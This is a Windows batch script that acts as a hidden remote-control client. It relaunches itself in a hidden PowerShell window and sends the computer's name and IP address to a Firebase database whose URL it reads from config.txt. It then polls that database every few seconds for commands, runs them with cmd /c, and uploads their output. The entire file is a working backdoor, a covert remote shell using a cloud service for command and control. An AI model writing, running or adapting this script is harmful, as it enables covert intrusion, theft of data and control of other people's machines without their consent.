@echo off
setlocal enabledelayedexpansion

:: Stealth mode - hide window if possible
if not defined _STEALTH (
    set "_STEALTH=1"
    powershell -windowstyle hidden -command "Start-Process '%~f0' -WindowStyle Hidden"
    exit /b
)

:: Function to check internet connection
:check_connection
echo [%TIME%] Checking network connection...
ping -n 1 8.8.8.8 >nul 2>&1
if %errorlevel% neq 0 (
    echo [%TIME%] No network connection. Waiting to retry...
    timeout /t 10 /nobreak >nul
    goto check_connection
)

:: Configuration
:: Read FIREBASE_URL from config.txt
set FIREBASE_URL=
for /f "usebackq delims=" %%a in ("config.txt") do set "FIREBASE_URL=%%a"
set CLIENT_PATH=/clients/%COMPUTERNAME%
set COMMAND_PATH=/commands/%COMPUTERNAME%

:: Initialize files
if exist output.txt del output.txt
if exist current_command.txt del current_command.txt
:: empty the cd_command.txt if it exists
if exist cd_command.txt del cd_command.txt

:: Get IP Address
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr "IPv4"') do (
    for /f "tokens=* delims= " %%b in ("%%a") do set IP_ADDRESS=%%b
)

:: Send IP to Firebase
echo [%TIME%] Sending IP address to Firebase...
curl -X PATCH -d "{\"ip\":\"%IP_ADDRESS%\", \"last_online\":\"%DATE% %TIME%\"}" "%FIREBASE_URL%%CLIENT_PATH%.json"

:: Command processing loop
:loop
:: Check connection before each iteration
ping -n 1 8.8.8.8 >nul 2>&1
if %errorlevel% neq 0 (
    echo [%TIME%] Connection lost. Waiting to reconnect...
    timeout /t 10 /nobreak >nul
    goto check_connection
)

echo [%TIME%] Checking for commands...
curl -s "%FIREBASE_URL%%COMMAND_PATH%/command.json" > current_command.txt

set CURRENT_COMMAND=
for /f "usebackq delims=" %%a in ("current_command.txt") do set "CURRENT_COMMAND=%%a"

:: Remove surrounding quotes if present
set CURRENT_COMMAND=!CURRENT_COMMAND:"=!

if "!CURRENT_COMMAND!" neq "null" (
    if "!CURRENT_COMMAND!" neq "" (
        if "!CURRENT_COMMAND!" neq "{"error":"404 Not Found"}" (
            :: if cd_command.txt exists, and not empty, run all the commands in it
            if exist cd_command.txt (
                set "ALL_COMMANDS="
                for /f "usebackq delims=" %%c in ("cd_command.txt") do (
                    set "ALL_COMMANDS=!ALL_COMMANDS!%%c & "
                )
                if "!CURRENT_COMMAND:~0,3!"=="cd " (
                    set "ALL_COMMANDS=!ALL_COMMANDS!!CURRENT_COMMAND! & cd"
                ) else (
                    set "ALL_COMMANDS=!ALL_COMMANDS!!CURRENT_COMMAND!"
                )
                echo [%TIME%] Executing combined commands: !ALL_COMMANDS!
                cmd /c "!ALL_COMMANDS!" > output.txt 2>&1
                if /i "!CURRENT_COMMAND:~0,3!"=="cd " (
                    echo !CURRENT_COMMAND! >> cd_command.txt
                )
            ) else (
                echo [%TIME%] Executing: !CURRENT_COMMAND!
                if /i "!CURRENT_COMMAND:~0,3!"=="cd " (
                    echo !CURRENT_COMMAND! >> cd_command.txt
                    cmd /c "!CURRENT_COMMAND! & cd" > output.txt 2>&1
                ) else (
                    cmd /c "!CURRENT_COMMAND!" > output.txt 2>&1
                )
            )
            
            :: Process output for JSON
            set "JSON_OUTPUT="
            for /f "delims=" %%a in ('type output.txt') do (
                set "line=%%a"
                :: Escape special characters
                set "line=!line:\=\\!"
                set "line=!line:"=\"!"
                set "line=!line:/=\/!"
                set "JSON_OUTPUT=!JSON_OUTPUT!!line!\n"
            )
            
            :: Remove trailing newline
            if defined JSON_OUTPUT set "JSON_OUTPUT=!JSON_OUTPUT:~0,-2!"
            
            :: Send output to Firebase
            echo [%TIME%] Sending results to Firebase...
            curl -X PATCH -d "{\"output\":\"!JSON_OUTPUT!\", \"status\":\"completed\", \"timestamp\":\"%DATE% %TIME%\"}" "%FIREBASE_URL%%COMMAND_PATH%.json"
            
            :: Clear the command
            echo [%TIME%] Clearing command...
            curl -X PATCH -d "{\"command\":null}" "%FIREBASE_URL%%COMMAND_PATH%.json"
        )
    )
)

timeout /t 5 /nobreak >nul
goto loop